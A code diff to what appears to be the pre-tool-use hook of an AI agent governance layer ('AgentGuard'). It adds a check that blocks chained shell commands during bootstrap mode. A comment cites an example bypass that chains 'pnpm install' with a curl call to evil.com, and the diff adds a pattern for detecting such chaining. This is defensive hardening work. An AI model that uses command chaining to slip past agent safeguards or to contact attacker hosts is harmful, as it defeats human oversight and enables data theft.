@@ -58,6 +58,15 @@ if [ -z "$AGENTGUARD_BIN" ]; then
     *'"tool_name":"WebFetch"'* ) BOOTSTRAP_SAFE=1 ;;
   esac
 
+  # SECURITY: reject if command contains chaining operators (&&, ||, ;, |, backtick)
+  # This prevents bypasses like "pnpm install && curl evil.com"
+  if [ "$BOOTSTRAP_SAFE" -eq 1 ]; then
+    CMD_VALUE=$(echo "$HOOK_PAYLOAD" | grep -oP '"command"\s*:\s*"\K[^"]*' | head -1)
+    if echo "$CMD_VALUE" | grep -qE '&&|\|\||[;`]|\|[^|]'; then
+      BOOTSTRAP_SAFE=0
+    fi
+  fi
+
   if [ "$BOOTSTRAP_SAFE" -eq 1 ]; then
     # Allow through — emit a warning so the agent knows governance is not active
     echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","additionalContext":"[AgentGuard bootstrap] Kernel binary not found — allowing bootstrap/read-only action. Run pnpm install && pnpm build to enable full governance."}}'
